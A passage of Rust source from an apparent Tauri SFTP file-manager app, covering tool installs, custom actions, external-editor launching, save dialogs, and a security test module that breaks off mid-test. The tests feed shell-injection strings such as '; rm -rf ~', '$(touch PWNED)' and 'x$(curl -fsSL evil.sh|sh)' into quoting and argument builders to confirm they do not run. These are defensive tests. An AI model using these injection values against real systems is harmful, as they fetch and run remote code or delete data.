        "htop" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y htop || apt-get install -y htop; elif command -v apk >/dev/null 2>&1; then apk add htop; elif command -v dnf >/dev/null 2>&1; then dnf install -y htop; elif command -v pacman >/dev/null 2>&1; then pacman -S --noconfirm htop; else echo 'Htop install failed' >&2; exit 1; fi",
        "btop" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y btop || apt-get install -y btop; elif command -v apk >/dev/null 2>&1; then apk add btop; elif command -v dnf >/dev/null 2>&1; then dnf install -y btop; else echo 'Btop install failed' >&2; exit 1; fi",
        "jq" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y jq || apt-get install -y jq; elif command -v apk >/dev/null 2>&1; then apk add jq; elif command -v dnf >/dev/null 2>&1; then dnf install -y jq; elif command -v pacman >/dev/null 2>&1; then pacman -S --noconfirm jq; else echo 'jq install failed' >&2; exit 1; fi",
        "rsync" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y rsync || apt-get install -y rsync; elif command -v apk >/dev/null 2>&1; then apk add rsync; elif command -v dnf >/dev/null 2>&1; then dnf install -y rsync; else echo 'rsync install failed' >&2; exit 1; fi",
        "tree" => "if command -v apt-get >/dev/null 2>&1; then sudo -n apt-get install -y tree || apt-get install -y tree; elif command -v apk >/dev/null 2>&1; then apk add tree; elif command -v dnf >/dev/null 2>&1; then dnf install -y tree; else echo 'tree install failed' >&2; exit 1; fi",
        other => return Err(format!("Ferramenta desconhecida '{}'", other)),
    };

    let (exit_code, stdout, stderr) = vfs
        .execute_command(install_cmd)
        .await
        .map_err(command_error_message)?;

    // Package managers can print a lot (apt progress, build logs): keep the tail.
    Ok(CommandExecutionResult {
        exit_code,
        stdout: cap_command_output(stdout, COMMAND_OUTPUT_MAX_BYTES),
        stderr: cap_command_output(stderr, COMMAND_OUTPUT_MAX_BYTES),
    })
}

// ---------------------- CUSTOM ACTIONS & COMMAND STUDIO ----------------------

#[tauri::command]
pub async fn manage_custom_actions(
    action: String,
    action_json: Option<String>,
    payload: Option<String>,
) -> Result<Vec<ActionDefinition>, String> {
    // `actionJson` is the documented argument; `payload` is accepted from older UIs.
    let action_json = action_json.or(payload);

    match action.as_str() {
        "list" => Ok(full_action_catalog().await),
        "save" | "delete" => {
            let arg = action_json
                .filter(|v| !v.trim().is_empty())
                .ok_or_else(|| format!("'{}' needs actionJson", action))?;
            let builtin_ids: std::collections::HashSet<String> = ActionCatalog::builtin_actions()
                .into_iter()
                .map(|a| a.id)
                .collect();

            let new_action = if action == "save" {
                let parsed: ActionDefinition = serde_json::from_str(&arg)
                    .map_err(|e| format!("Invalid custom action: {}", e))?;
                if parsed.id.trim().is_empty() {
                    return Err("A custom action needs an id".to_string());
                }
                if parsed.template.trim().is_empty() {
                    return Err("A custom action needs a command template".to_string());
                }
                if builtin_ids.contains(&parsed.id) {
                    return Err(format!(
                        "'{}' is the id of a built-in action: choose another id",
                        parsed.id
                    ));
                }
                Some(parsed)
            } else {
                if builtin_ids.contains(&arg) {
                    return Err("Built-in actions cannot be deleted".to_string());
                }
                None
            };

            let _guard = CUSTOM_ACTIONS_LOCK.lock().await;
            let path = custom_actions_path();
            let custom =
                tokio::task::spawn_blocking(move || -> Result<Vec<ActionDefinition>, String> {
                    let mut custom = read_custom_actions(&path)?;
                    match new_action {
                        Some(new_action) => {
                            match custom.iter().position(|a| a.id == new_action.id) {
                                Some(pos) => custom[pos] = new_action,
                                None => custom.push(new_action),
                            }
                        }
                        None => custom.retain(|a| a.id != arg),
                    }
                    write_custom_actions(&path, &custom)?;
                    Ok(custom)
                })
                .await
                .map_err(|e| e.to_string())??;
            Ok(merge_action_catalog(custom))
        }
        _ => Err("Invalid action".to_string()),
    }
}

// ---------------------- EXTERNAL EDITOR INTEGRATION ----------------------

/// How often the temp copy of a remote file is checked for saves.
const EXTERNAL_EDIT_POLL: std::time::Duration = std::time::Duration::from_secs(2);
/// How long a remote file opened in an external editor keeps being synced back.
const EXTERNAL_EDIT_MAX: std::time::Duration = std::time::Duration::from_secs(8 * 60 * 60);

/// Splits an editor command line into words like `shlex` / a POSIX shell (single and
/// double quotes, backslash escapes) without running a shell: `code --wait`,
/// `"/Applications/My Editor.app/Contents/MacOS/editor" -n`. With `posix_escapes`
/// false (Windows) a backslash is an ordinary character, so `C:\Tools\ed.exe` works.
pub(crate) fn split_command_line(input: &str, posix_escapes: bool) -> Result<Vec<String>, String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut in_word = false;
    let mut chars = input.chars();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_word = true;
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(ch) => current.push(ch),
                        None => return Err("Unterminated ' in the editor command".to_string()),
                    }
                }
            }
            '"' => {
                in_word = true;
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some('\\') if posix_escapes => match chars.next() {
                            Some(ch @ ('"' | '\\' | '$' | '`')) => current.push(ch),
                            Some('\n') => {}
                            Some(ch) => {
                                current.push('\\');
                                current.push(ch);
                            }
                            None => return Err("Unterminated \" in the editor command".to_string()),
                        },
                        Some(ch) => current.push(ch),
                        None => return Err("Unterminated \" in the editor command".to_string()),
                    }
                }
            }
            '\\' if posix_escapes => {
                in_word = true;
                match chars.next() {
                    Some('\n') => {}
                    Some(ch) => current.push(ch),
                    None => current.push('\\'),
                }
            }
            c if c.is_whitespace() => {
                if in_word {
                    words.push(std::mem::take(&mut current));
                    in_word = false;
                }
            }
            c => {
                in_word = true;
                current.push(c);
            }
        }
    }
    if in_word {
        words.push(current);
    }
    Ok(words)
}

/// Windows lookup of a bare program name (`code`, `cursor`) in `path_var`, trying each
/// extension of `pathext` that a process can be started from (.com, .exe, .bat, .cmd).
/// Rust's `Command` itself only appends `.exe`, but VS Code and Cursor put only
/// `bin\code.cmd` / `cursor.cmd` on PATH. Names with a folder or an extension, and
/// relative PATH entries (the current folder), are never searched.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
fn find_windows_program(
    program: &str,
    path_var: Option<&std::ffi::OsStr>,
    pathext: Option<&str>,
) -> Option<std::path::PathBuf> {
    if program.is_empty()
        || program.contains(['/', '\\', ':'])
        || std::path::Path::new(program).extension().is_some()
    {
        return None;
    }
    const RUNNABLE: [&str; 4] = [".com", ".exe", ".bat", ".cmd"];
    let mut extensions: Vec<String> = pathext
        .unwrap_or(".COM;.EXE;.BAT;.CMD")
        .split(';')
        .map(|e| e.trim().to_ascii_lowercase())
        .filter(|e| RUNNABLE.contains(&e.as_str()))
        .collect();
    if extensions.is_empty() {
        extensions = RUNNABLE.iter().map(|e| e.to_string()).collect();
    }
    for dir in std::env::split_paths(path_var?) {
        if !dir.is_absolute() {
            continue;
        }
        for ext in &extensions {
            let candidate = dir.join(format!("{program}{ext}"));
            if candidate.is_file() {
                return Some(candidate);
            }
        }
    }
    None
}

/// Finds an editor program. Apps started from Finder/Dock do not inherit the login
/// shell's PATH, so after PATH the usual install folders (Homebrew, ~/.local/bin) and
/// the command-line launchers inside common macOS app bundles are tried. On Windows a
/// bare name is looked up with PATHEXT, so `code` finds VS Code's `code.cmd`.
fn resolve_editor_program(program: &str) -> std::path::PathBuf {
    let expanded = expand_local_home(program);
    let as_path = std::path::Path::new(&expanded);
    if cfg!(target_os = "windows") {
        if as_path.is_absolute() || expanded.contains(['/', '\\']) {
            return as_path.to_path_buf();
        }
        let path_var = std::env::var_os("PATH");
        let pathext = std::env::var("PATHEXT").ok();
        return find_windows_program(&expanded, path_var.as_deref(), pathext.as_deref())
            .unwrap_or_else(|| as_path.to_path_buf());
    }
    if as_path.is_absolute() || expanded.contains('/') {
        return as_path.to_path_buf();
    }
    let home = std::env::var("HOME").unwrap_or_default();
    let mut dirs: Vec<std::path::PathBuf> = std::env::var_os("PATH")
        .map(|p| std::env::split_paths(&p).collect())
        .unwrap_or_default();
    for extra in [
        "/opt/homebrew/bin",
        "/usr/local/bin",
        "/usr/bin",
        "/snap/bin",
    ] {
        dirs.push(std::path::PathBuf::from(extra));
    }
    if !home.is_empty() {
        dirs.push(std::path::Path::new(&home).join(".local/bin"));
        dirs.push(std::path::Path::new(&home).join("bin"));
    }
    for dir in dirs {
        let candidate = dir.join(&expanded);
        if candidate.is_file() {
            return candidate;
        }
    }
    if cfg!(target_os = "macos") {
        let bundle_cli = match expanded.as_str() {
            "code" => Some("Visual Studio Code.app/Contents/Resources/app/bin/code"),
            "code-insiders" => {
                Some("Visual Studio Code - Insiders.app/Contents/Resources/app/bin/code-insiders")
            }
            "cursor" => Some("Cursor.app/Contents/Resources/app/bin/cursor"),
            "subl" => Some("Sublime Text.app/Contents/SharedSupport/bin/subl"),
            "zed" => Some("Zed.app/Contents/MacOS/cli"),
            _ => None,
        };
        if let Some(rel) = bundle_cli {
            let mut roots = vec![std::path::PathBuf::from("/Applications")];
            if !home.is_empty() {
                roots.push(std::path::Path::new(&home).join("Applications"));
            }
            for root in roots {
                let candidate = root.join(rel);
                if candidate.is_file() {
                    return candidate;
                }
            }
        }
    }
    as_path.to_path_buf()
}

/// Whether a MIME type (from `xdg-mime query filetype`) is text that the desktop's
/// default app only displays or edits. HTML / XML go to a browser and are left out.
#[cfg_attr(any(target_os = "macos", target_os = "windows"), allow(dead_code))]
fn is_editable_text_mime(mime: &str) -> bool {
    let mime = mime.trim().to_ascii_lowercase();
    mime.starts_with("text/") && !mime.contains("html") && !mime.contains("xml")
}

/// Opens `file` in a plain text editor when the configured editor cannot be started.
/// Never the OS default handler (`open`, `explorer.exe`, `xdg-open` on any file): for a
/// downloaded `setup.exe`, `deploy.bat`, `.js`, `.vbs` or `.jar` that would run the
/// file instead of opening it.
async fn open_in_fallback_text_editor(file_arg: &str) -> Result<&'static str, String> {
    #[cfg(target_os = "macos")]
    {
        // `open -t` uses the default *text editor* (TextEdit), whatever the file type.
        tokio::process::Command::new("open")
            .arg("-t")
            .arg(file_arg)
            .spawn()
            .map(|_| "the default text editor")
            .map_err(|e| e.to_string())
    }
    #[cfg(target_os = "windows")]
    {
        let notepad = std::env::var_os("SystemRoot")
            .map(|root| {
                std::path::Path::new(&root)
                    .join("System32")
                    .join("notepad.exe")
            })
            .filter(|p| p.is_file())
            .unwrap_or_else(|| std::path::PathBuf::from("notepad.exe"));
        tokio::process::Command::new(notepad)
            .arg(file_arg)
            .spawn()
            .map(|_| "Notepad")
            .map_err(|e| e.to_string())
    }
    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    {
        // xdg-open only for files the desktop itself classifies as text, whose default
        // app is a text editor or viewer (never a launcher for scripts or binaries).
        let mime = tokio::process::Command::new("xdg-mime")
            .args(["query", "filetype"])
            .arg(file_arg)
            .stdin(std::process::Stdio::null())
            .output()
            .await
            .ok()
            .filter(|out| out.status.success())
            .map(|out| String::from_utf8_lossy(&out.stdout).trim().to_string())
            .unwrap_or_default();
        if !is_editable_text_mime(&mime) {
            return Err(if mime.is_empty() {
                "the file type could not be determined".to_string()
            } else {
                format!("'{mime}' files are not opened with the default app")
            });
        }
        tokio::process::Command::new("xdg-open")
            .arg(file_arg)
            .spawn()
            .map(|_| "the default text editor")
            .map_err(|e| e.to_string())
    }
}

/// Opens `file` with the user's editor command (split into program + arguments, the
/// file appended as the last argument, no shell). When that program cannot be started,
/// falls back to a plain text editor, never to the OS default app (see
/// [`open_in_fallback_text_editor`]).
async fn launch_external_editor(
    editor_cmd: Option<&str>,
    file: &std::path::Path,
) -> Result<String, String> {
    let words = match editor_cmd.map(str::trim).filter(|c| !c.is_empty()) {
        Some(cmd) => split_command_line(cmd, !cfg!(target_os = "windows"))?,
        None => vec!["code".to_string()],
    };
    let (program, args) = words
        .split_first()
        .ok_or_else(|| "The external editor command is empty".to_string())?;
    let file_arg = {
        let s = file.to_string_lossy().to_string();
        // A path starting with '-' could be read as an option by the editor.
        if s.starts_with('-') {
            format!("./{s}")
        } else {
            s
        }
    };
    let program_path = resolve_editor_program(program);

    let spawned = tokio::process::Command::new(&program_path)
        .args(args)
        .arg(&file_arg)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();

    match spawned {
        Ok(_) => Ok(format!("Opened '{}' in {}", file.display(), program)),
        Err(e) => match open_in_fallback_text_editor(&file_arg).await {
            Ok(editor) => Ok(format!(
                "Opened '{}' in {} ('{}' could not be started: {})",
                file.display(),
                editor,
                program,
                e
            )),
            Err(fe) => Err(format!(
                "Could not start '{}': {}. Set an editor command in Settings ({})",
                program, e, fe
            )),
        },
    }
}

/// Modification time and size of a local file (`None` when it cannot be read).
async fn local_file_stamp(path: &std::path::Path) -> Option<(Option<std::time::SystemTime>, u64)> {
    let meta = tokio::fs::metadata(path).await.ok()?;
    Some((meta.modified().ok(), meta.len()))
}

/// Uploads the temp copy of a remote file every time the external editor saves it
/// (polled every 2 s; a change is uploaded once it has been stable for one poll). Stops
/// after 8 h or when the session is disconnected; the temp folder is then removed
/// unless it still holds changes that could not be uploaded.
#[allow(clippy::too_many_arguments)]
fn spawn_external_edit_watcher(
    sessions: Arc<RwLock<HashMap<String, Arc<dyn VirtualFileSystem>>>>,
    session_id: String,
    vfs: Arc<dyn VirtualFileSystem>,
    remote_path: String,
    local_file: std::path::PathBuf,
    temp_dir: std::path::PathBuf,
    cache: Arc<ManagedDiskCache>,
    baseline: Option<(Option<std::time::SystemTime>, u64)>,
) {
    tokio::spawn(async move {
        let started = std::time::Instant::now();
        let mut uploaded = baseline;
        let mut pending: Option<(Option<std::time::SystemTime>, u64)> = None;
        let mut unsynced = false;
        loop {
            tokio::time::sleep(EXTERNAL_EDIT_POLL).await;
            // Same driver as when the file was opened (a reconnect gets a new one).
            let alive = sessions
                .read()
                .await
                .get(&session_id)
                .is_some_and(|current| Arc::ptr_eq(current, &vfs));
            let stamp = local_file_stamp(&local_file).await;
            if stamp.is_some() && stamp != uploaded {
                unsynced = true;
                if alive && pending == stamp {
                    match upload_local_file(&vfs, &local_file, &remote_path).await {
                        Ok(_) => {
                            uploaded = stamp;
                            unsynced = false;
                            cache.invalidate_catalog(&session_id, &remote_path).await;
                            cache.invalidate_content(&session_id, &remote_path).await;
                            tracing::info!("external editor: uploaded {remote_path}");
                        }
                        Err(e) => {
                            tracing::warn!("external editor: could not upload {remote_path}: {e}");
                        }
                    }
                    pending = None;
                } else {
                    pending = stamp;
                }
            }
            if !alive || started.elapsed() >= EXTERNAL_EDIT_MAX {
                break;
            }
        }
        if unsynced {
            tracing::warn!(
                "external editor: changes to {remote_path} were not uploaded; the copy is kept at {}",
                local_file.display()
            );
        } else {
            let _ = tokio::fs::remove_dir_all(&temp_dir).await;
        }
    });
}

#[tauri::command]
pub async fn open_in_external_editor(
    state: tauri::State<'_, AppState>,
    path: String,
    editor_cmd: Option<String>,
    session_id: Option<String>,
) -> Result<String, String> {
    if path.trim().is_empty() || path.contains('\0') {
        return Err("Invalid file path".to_string());
    }
    let session_id = session_id
        .filter(|s| !s.trim().is_empty())
        .unwrap_or_else(|| "local".to_string());
    let vfs = get_vfs(&state, &session_id).await?;

    if vfs.protocol() == Protocol::Local {
        let local = std::path::PathBuf::from(expand_local_home(&path));
        return launch_external_editor(editor_cmd.as_deref(), &local).await;
    }

    // Remote file: edit a private local copy and upload every save back.
    if vfs.metadata(&path).await.is_ok_and(|m| m.is_dir()) {
        return Err(format!("'{}' is a folder, not a file", path));
    }
    let temp_dir = create_private_temp_dir("rustscp-edit")?;
    let local_file = temp_dir.join(local_file_name_for(&path));
    if let Err(e) = download_to_private_file(&vfs, &path, &local_file).await {
        let _ = tokio::fs::remove_dir_all(&temp_dir).await;
        return Err(format!("Could not download '{}': {}", path, e));
    }
    let baseline = local_file_stamp(&local_file).await;

    let message = match launch_external_editor(editor_cmd.as_deref(), &local_file).await {
        Ok(message) => message,
        Err(e) => {
            let _ = tokio::fs::remove_dir_all(&temp_dir).await;
            return Err(e);
        }
    };

    spawn_external_edit_watcher(
        state.active_sessions.clone(),
        session_id,
        vfs,
        path,
        local_file,
        temp_dir,
        state.disk_cache.clone(),
        baseline,
    );
    Ok(message)
}

// ---------------------- NATIVE SAVE DIALOG ----------------------

/// AppleScript "Save as" sheet; prompt and default name arrive through `argv`, so no
/// value is ever spliced into the script source. Cancel returns "".
#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
const MACOS_SAVE_DIALOG_SCRIPT: &str = "on run argv\n\
    try\n\
        set chosenFile to choose file name with prompt (item 1 of argv) default name (item 2 of argv)\n\
        return POSIX path of chosenFile\n\
    on error number -128\n\
        return \"\"\n\
    end try\n\
end run";

/// PowerShell SaveFileDialog; the suggested name comes from an environment variable,
/// never from the script text.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
const WINDOWS_SAVE_DIALOG_SCRIPT: &str = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; \
Add-Type -AssemblyName System.Windows.Forms; \
$d = New-Object System.Windows.Forms.SaveFileDialog; \
$d.FileName = $env:RUSTSCP_SUGGESTED_NAME; \
$d.Filter = 'All files (*.*)|*.*'; \
$d.OverwritePrompt = $true; \
if ($d.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) { [Console]::Out.Write($d.FileName) }";

/// Shows the platform's "Save as" dialog. `Ok(None)` = cancelled; `Err` = no dialog.
fn native_save_dialog(suggested_name: &str) -> Result<Option<String>, String> {
    let picked = |stdout: &[u8]| {
        let path = String::from_utf8_lossy(stdout).trim().to_string();
        if path.is_empty() {
            None
        } else {
            Some(path)
        }
    };

    #[cfg(target_os = "macos")]
    {
        let output = std::process::Command::new("osascript")
            .arg("-e")
            .arg(MACOS_SAVE_DIALOG_SCRIPT)
            .arg("Save as")
            .arg(suggested_name)
            .output()
            .map_err(|e| format!("Could not open the save dialog: {}", e))?;
        if !output.status.success() {
            return Err(format!(
                "Could not open the save dialog: {}",
                String::from_utf8_lossy(&output.stderr).trim()
            ));
        }
        return Ok(picked(&output.stdout));
    }

    #[cfg(target_os = "windows")]
    {
        let output = std::process::Command::new("powershell")
            .args([
                "-NoProfile",
                "-NonInteractive",
                "-STA",
                "-Command",
                WINDOWS_SAVE_DIALOG_SCRIPT,
            ])
            .env("RUSTSCP_SUGGESTED_NAME", suggested_name)
            .output()
            .map_err(|e| format!("Could not open the save dialog: {}", e))?;
        if !output.status.success() {
            return Err(format!(
                "Could not open the save dialog: {}",
                String::from_utf8_lossy(&output.stderr).trim()
            ));
        }
        return Ok(picked(&output.stdout));
    }

    #[cfg(all(unix, not(target_os = "macos")))]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let default_path = if home.is_empty() {
            suggested_name.to_string()
        } else {
            std::path::Path::new(&home)
                .join(suggested_name)
                .to_string_lossy()
                .to_string()
        };
        // zenity / kdialog exit 1 when the user cancels.
        match std::process::Command::new("zenity")
            .arg("--file-selection")
            .arg("--save")
            .arg("--confirm-overwrite")
            .arg("--title=Save as")
            .arg(format!("--filename={}", default_path))
            .output()
        {
            Ok(out) if out.status.success() => return Ok(picked(&out.stdout)),
            Ok(out) if out.status.code() == Some(1) => return Ok(None),
            _ => {}
        }
        match std::process::Command::new("kdialog")
            .arg("--getsavefilename")
            .arg(&default_path)
            .output()
        {
            Ok(out) if out.status.success() => return Ok(picked(&out.stdout)),
            Ok(out) if out.status.code() == Some(1) => return Ok(None),
            _ => {}
        }
        return Err("No native save dialog is available (install zenity or kdialog)".to_string());
    }

    #[allow(unreachable_code)]
    {
        let _ = (suggested_name, picked);
        Err("No native save dialog is available on this platform".to_string())
    }
}

/// Native "Save as" for text the UI produced (e.g. an exported vault). Writes the file
/// atomically with owner-only permissions and returns its path, `None` when the user
/// cancelled, or an error when no dialog is available (the UI then offers copying).
#[tauri::command]
pub async fn save_text_file_dialog(
    contents: String,
    suggested_name: String,
) -> Result<Option<String>, String> {
    let name = sanitize_display_name(&suggested_name, "rustscp-export.txt");
    let chosen = tokio::task::spawn_blocking(move || native_save_dialog(&name))
        .await
        .map_err(|e| e.to_string())??;
    let Some(path) = chosen else {
        return Ok(None);
    };
    let target = std::path::PathBuf::from(&path);
    tokio::task::spawn_blocking(move || {
        rustscp_core::vault::write_private_file_atomic(&target, contents.as_bytes())
    })
    .await
    .map_err(|e| e.to_string())?
    .map_err(|e| format!("Could not save '{}': {}", path, e))?;
    Ok(Some(path))
}

// ---------------------- DIRECTORY CACHE MANAGEMENT ----------------------

#[tauri::command]
pub async fn invalidate_directory_cache(
    state: tauri::State<'_, AppState>,
    session_id: String,
    path: Option<String>,
) -> Result<(), String> {
    if let Some(p) = path {
        state.disk_cache.invalidate_catalog(&session_id, &p).await;
    } else {
        require_valid_session_id(&session_id)?;
        state
            .disk_cache
            .clear_session(&session_id)
            .await
            .map_err(|e| e.to_string())?;
    }
    Ok(())
}

#[cfg(test)]
mod security_tests {
    use super::*;
    use rustscp_core::AuthMethod;

    const NASTY: &[&str] = &[
        "",
        "plain",
        "John's files",
        "x';touch PWNED;'.txt",
        "a');touch PWNED;#.zip",
        "$(touch PWNED)",
        "`touch PWNED`",
        "a\"b\\c",
        "\\'",
        "''",
        "line1\nline2",
        "-rf",
        "*",
        "~",
        "$HOME",
        "; rm -rf ~",
        "x$(curl -fsSL evil.sh|sh)",
        "café ünïcödé",
    ];

    fn site(id: &str, auth: AuthMethod) -> ConnectionConfig {
        ConnectionConfig {
            id: id.to_string(),
            name: "Server".to_string(),
            protocol: Protocol::Sftp,
            host: "example.com".to_string(),
            port: 22,
            username: "deploy".to_string(),
            auth,
            remote_root: "/".to_string(),
        }
    }

    /// Unique scratch directory under the system temp dir, removed on drop.
    struct ScratchDir(std::path::PathBuf);
    impl ScratchDir {
        fn new(tag: &str) -> Self {
            let dir = std::env::temp_dir().join(format!(
                "rustscp-test-{tag}-{}",
                uuid::Uuid::new_v4().simple()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            Self(dir)
        }
        fn path(&self) -> &std::path::Path {
            &self.0
        }
        fn s(&self) -> String {
            self.0.to_string_lossy().to_string()
        }
    }
    impl Drop for ScratchDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    #[test]
    fn sh_quote_encodes_single_quotes() {
        assert_eq!(sh_quote(""), "''");
        assert_eq!(sh_quote("abc"), "'abc'");
        assert_eq!(sh_quote("it's"), "'it'\\''s'");
        assert_eq!(sh_quote("''"), "''\\'''\\'''");
        assert_eq!(sh_join(&["a b", "c'd"]), "'a b' 'c'\\''d'");
    }

    #[cfg(unix)]
    #[test]
    fn sh_quote_round_trips_through_posix_sh() {
        for value in NASTY {
            let script = format!("printf '%s' {}", sh_quote(value));
            let out = std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(&script)
                .output()
                .unwrap();
            assert!(out.status.success(), "sh failed for {value:?}");
            assert_eq!(
                String::from_utf8_lossy(&out.stdout),
                *value,
                "round trip of {value:?}"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn sh_join_preserves_argv_boundaries() {
        let args: Vec<String> = NASTY.iter().map(|s| s.to_string()).collect();
        let script = format!("printf '%s\\0' {}", sh_join(&args));
        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&script)
            .output()
            .unwrap();
        assert!(out.status.success());
        let parsed: Vec<String> = String::from_utf8_lossy(&out.stdout)
            .split('\0')
            .map(|s| s.to_string())
            .collect();
        // printf leaves one empty field after the final NUL.
        assert_eq!(&parsed[..parsed.len() - 1], &args[..]);
    }

    #[test]
    fn safe_operand_prefixes_option_like_names() {
        assert_eq!(safe_operand("-rf"), "./-rf");
        assert_eq!(safe_operand("file.txt"), "file.txt");
        assert_eq!(safe_operand("/abs/-x"), "/abs/-x");
    }

    #[cfg(unix)]
    #[test]
    fn compress_and_extract_commands_do_not_run_crafted_names() {
        let dir = ScratchDir::new("archive");
        let evil_file = "x';touch PWNED1;'.txt";
        let evil_dir = "$(touch PWNED2)";
        std::fs::write(dir.path().join(evil_file), b"hello").unwrap();
        std::fs::create_dir(dir.path().join(evil_dir)).unwrap();
        std::fs::write(dir.path().join(evil_dir).join("inner"), b"inner").unwrap();
        std::fs::write(dir.path().join("-rf"), b"dash").unwrap();

        let items = vec![
            evil_file.to_string(),
            evil_dir.to_string(),
            "-rf".to_string(),
        ];
        let output = "a';touch PWNED3;'.tar";
        let cmd = build_compress_command(
            &dir.s(),
            &items,
            ArchiveKind::Tar,
            output,
            &partial_archive_name(output),
            false,
        );
        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&cmd)
            .current_dir(dir.path())
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "compress failed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(dir.path().join(output).is_file(), "archive was not created");

        let archive = dir.path().join(output).to_string_lossy().to_string();
        let target = extraction_target(&dir.s(), Some("it's $(touch PWNED4)")).unwrap();
        let cmd = build_extract_command(&archive, &target, ArchiveKind::Tar, false);
        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&cmd)
            .current_dir(dir.path())
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "extract failed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        let extracted = std::path::Path::new(&target);
        assert!(extracted.join(evil_file).is_file());
        assert!(extracted.join(evil_dir).join("inner").is_file());
        assert!(extracted.join("-rf").is_file());

        for marker in ["PWNED1", "PWNED2", "PWNED3", "PWNED4"] {
            assert!(!dir.path().join(marker).exists(), "{marker} was executed");
            assert!(!extracted.join(marker).exists(), "{marker} was executed");
        }
    }

    #[test]
    fn archive_names_and_targets_are_validated() {
        assert!(validate_archive_output_name("backup.tar.gz").is_ok());
        assert!(validate_archive_output_name("it's.zip").is_ok());
        assert!(validate_archive_output_name("../x.zip").is_err());
        assert!(validate_archive_output_name("a\\b.zip").is_err());
        assert!(validate_archive_output_name("a\nb.zip").is_err());
        assert!(validate_archive_output_name("").is_err());

        assert_eq!(extraction_target("/srv/www", None).unwrap(), "/srv/www");
        assert_eq!(
            extraction_target("/srv/www/", Some(".")).unwrap(),
            "/srv/www/"
        );
        assert_eq!(
            extraction_target("/srv/www/", Some("site")).unwrap(),
            "/srv/www/site"
        );
        assert_eq!(
            extraction_target("/srv/www", Some("a/b/")).unwrap(),
            "/srv/www/a/b"
        );
        assert!(extraction_target("/srv/www", Some("../etc")).is_err());
        assert!(extraction_target("/srv/www", Some("a/../../etc")).is_err());
        assert!(extraction_target("/srv/www", Some("a\nb")).is_err());

        assert_eq!(archive_item_name("/srv/www/site/", false), "site");
        assert_eq!(archive_item_name("a\\b", false), "a\\b");
        assert_eq!(archive_item_name("C:\\data\\b", true), "b");
        assert!(validate_archive_item("..").is_err());
        assert!(validate_archive_item("").is_err());
    }

    #[test]
    fn windows_tar_args_are_separate_arguments() {
        let args = windows_tar_create_args(
            ArchiveKind::Zip,
            "out&calc.zip",
            &["-a".to_string(), "b'&calc&'.txt".to_string()],
        );
        assert_eq!(
            args,
            vec![
                "-c",
                "--format=zip",
                "-f",
                "out&calc.zip",
                "./-a",
                "b'&calc&'.txt"
            ]
        );
        assert_eq!(
            windows_tar_extract_args("C:\\a.zip", "C:\\out", true),
            vec!["-x", "-f", "C:\\a.zip", "-C", "C:\\out"]
        );
        assert_eq!(
            windows_tar_extract_args("C:\\a.zip", "C:\\out", false),
            vec!["-x", "-k", "-f", "C:\\a.zip", "-C", "C:\\out"]
        );
    }

    #[test]
    fn ssh_terminal_args_are_an_argument_vector() {
        let mut cfg = site(
            "s1",
            AuthMethod::PrivateKey {
                path: "/Users/me/keys/my key".to_string(),
                passphrase: None,
            },
        );
        cfg.port = 2222;
        let args = ssh_terminal_args(&cfg, "/srv/$(touch PWNED)\"x'").unwrap();
        assert_eq!(
            &args[..7],
            &[
                "-p",
                "2222",
                "-i",
                "/Users/me/keys/my key",
                "-t",
                "--",
                "deploy@example.com"
            ]
        );
        assert_eq!(args.len(), 8);
        assert_eq!(
            args[7],
            format!(
                "cd {} 2>/dev/null || cd; exec \"$SHELL\" -l",
                sh_quote("/srv/$(touch PWNED)\"x'")
            )
        );

        cfg.username = "-oProxyCommand=calc".to_string();
        assert!(ssh_terminal_args(&cfg, "/").is_err());
        cfg.username = "deploy".to_string();
        cfg.host = "srv; rm -rf ~".to_string();
        assert!(ssh_terminal_args(&cfg, "/").is_err());
        cfg.host = "-oProxyCommand=calc".to_string();
        assert!(ssh_terminal_args(&cfg, "/").is_err());
        cfg.host = "[fe80::1%en0]".to_string();
        let args = ssh_terminal_args(&cfg, "").unwrap();
        assert!(args.contains(&"deploy@fe80::1%en0".to_string()));
        assert_eq!(
            args.last().unwrap(),
            "cd 2>/dev/null || cd; exec \"$SHELL\" -l"
        );
    }

    #[test]
    fn remote_terminal_command_handles_home_paths() {
        assert_eq!(
            remote_terminal_command("~"),
            "cd 2>/dev/null || cd; exec \"$SHELL\" -l"
        );
        assert_eq!(
            remote_terminal_command("~/my dir"),
            "cd ~/'my dir' 2>/dev/null || cd; exec \"$SHELL\" -l"
        );
        assert_eq!(
            remote_terminal_command("-x"),
            "cd './-x' 2>/dev/null || cd; exec \"$SHELL\" -l"
        );
    }

    #[cfg(unix)]
    #[test]
    fn remote_terminal_command_enters_crafted_directory_without_running_it() {
        let dir = ScratchDir::new("terminal");
        let evil = dir.path().join("$(touch PWNED)'\"; x `id`");
        std::fs::create_dir(&evil).unwrap();
        let cmd = remote_terminal_command(&evil.to_string_lossy());
        let mut child = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&cmd)
            .env("SHELL", "/bin/sh")
            .env("ENV", "/dev/null")
            .current_dir(dir.path())
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
